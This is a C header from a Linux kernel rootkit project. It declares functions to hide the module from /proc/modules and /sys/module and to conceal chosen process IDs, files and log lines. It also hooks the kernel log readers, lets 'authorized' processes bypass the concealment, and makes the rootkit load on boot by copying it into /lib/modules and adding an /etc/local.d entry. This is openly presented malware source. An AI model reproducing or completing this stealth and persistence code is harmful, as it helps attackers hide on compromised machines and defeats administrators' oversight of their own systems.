#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include "constants.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <vdso/limits.h>

/**
 * Creates a new `string_t` structure with the given string value.
 *
 * @param _s_str The string value
 * @return The new `string_t` structure
 */
#define NEW_STRING_ENTRY(_s_str)                        \
    {                                                   \
        .s_str = (_s_str), .sz_len = sizeof(_s_str) - 1 \
    }

/**
 * Creates an array of `string_t` structures from the given strings.
 *
 * @param ... The strings
 * @return The array of `string_t` structures
 */
#define STRING_ARRAY(...)                                   \
    {                                                       \
        __MAPX_LIST(NEW_STRING_ENTRY, __VA_ARGS__),         \
        {                                                   \
            /* The last element must have a NULL `s_str` */ \
            NULL, 0                                         \
        }                                                   \
    }

/**
 * Structure representing an entry in a list of PIDs.
 */
typedef struct pid_list_tag {
    struct list_head list; // PID linked list head
    pid_t i32_pid;         // PID value
} pid_list_t;

typedef struct buffer_tag {
    void *p_data;  // Pointer to the buffer data
    size_t sz_len; // Size of the buffer
} buffer_t;

struct module_notes_attrs {
    struct kobject *dir;
    unsigned int notes;
    struct bin_attribute attrs[];
};

struct module_sect_attr {
    struct bin_attribute battr;
    unsigned long address;
};

struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[];
};

typedef struct file file_t;
typedef struct path path_t;
typedef struct inode inode_t;
typedef struct dentry dentry_t;
typedef struct files_struct files_t;
typedef struct task_struct task_t;

typedef ssize_t (*proc_read_t)(file_t *file, char __user *buf, size_t count, loff_t *ppos);

extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
// Head of the authorized PIDs linked list (processes that bypass the rootkit)
extern struct list_head authorized_pids_list;

/**
 * Gets the effective PID for the given PID.
 * If it is 0, return the current PID.
 * If it is -1 or INT_MIN, return -1.
 * If it is < -1, return the absolute value.
 * Otherwise, return the given PID.
 *
 * @param i32_pid The PID to get the effective PID for
 * @return The effective PID
 */
static inline pid_t get_effective_pid(const pid_t i32_pid)
{
    if (i32_pid == 0) {
        return current->pid;
    }

    if (i32_pid == INT_MIN) {
        return -1;
    }

    if (i32_pid < -1) {
        return -i32_pid;
    }

    return i32_pid;
}

/**
 * Copies data from user space to kernel space, chunk by chunk.
 * @note Taken from kernel code (kernel/module.c), as it is static.
 *
 * @param p_dst    The destination (kernel) buffer
 * @param p_usrc   The source (user) buffer
 * @param ui64_len The length of the data to copy
 * @return 0 on success, otherwise an error code
 */
int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len);

/**
 * Does the given file name need to be hidden?
 *
 * @param s_filename The file name to check
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
bool is_filename_hidden(const char *const s_filename);

/**
 * Hides the rootkit from /proc/modules and /sys/module/, and several other places.
 */
void hide_module(void);

/**
 * Unhides the rootkit from /proc/modules.
 */
void unhide_module(void);

/**
 * Checks if the given PID is in the list of hidden processes.
 * If the given PID is 0, the current process is checked.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of hidden processes, `false` otherwise
 */
bool is_pid_hidden(const pid_t i32_pid);

/**
 * Clears the list of hidden PIDs and frees all associated memory.
 */
void show_all_processes(void);

/**
 * Checks if the given PID is in the list of authorized processes.
 * If the given PID is 0, the current process is checked.
 * @note Authorized processes bypass the rootkit protection mechanisms.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of authorized processes, `false` otherwise
 */
bool is_process_authorized(const pid_t i32_pid);

/**
 * Clears the list of authorized PIDs and frees all associated memory.
 */
void clear_auth_list(void);

/**
 * Restores the original `kmsg_read()` and `devkmsg_read()` functions.
 */
void restore_kmsg_read(void);

/**
 * If the current process is authorized, returns `false`.
 * Otherwise, checks if the given PID is hidden.
 *
 * @param i32_pid The PID to check
 * @return `false` if the current process is authorized, otherwise return whether the given PID is
 * hidden
 */
static inline bool check_pid_hidden_auth(const pid_t i32_pid)
{
    return (!is_process_authorized(PID_SELF)) && is_pid_hidden(i32_pid);
}

/**
 * Hides lines that contain the given string.
 *
 * @param s_buffer The user buffer to hide lines from
 * @param sz_len   The length of the user buffer
 * @param s_search The string to search for
 * @return The new length of the user buffer
 */
size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search);

/**
 * Copies a file from the given source path to destination path, in kernel space.
 *
 * @param p_src_file The source file
 * @param p_dst_file The destination file
 * @return 0 on success, otherwise an error code
 */
int kernel_copy_file(file_t *const p_src_file, file_t *const p_dst_file);

/**
 * Copies the module file (/root/rootkit.ko) to /lib/modules/rootkit_mod.ko.
 *
 * @return 0 on success, otherwise an error code
 */
int copy_module_file(void);

/**
 * Creates a file in /etc/local.d/ to automatically load the rootkit on boot.
 * @note This function is only available on OpenRC-based systems
 *       and requires service `local` to be enabled.
 *
 * @return 0 on success, otherwise an error code
 */
int create_locald_file(void);

#endif
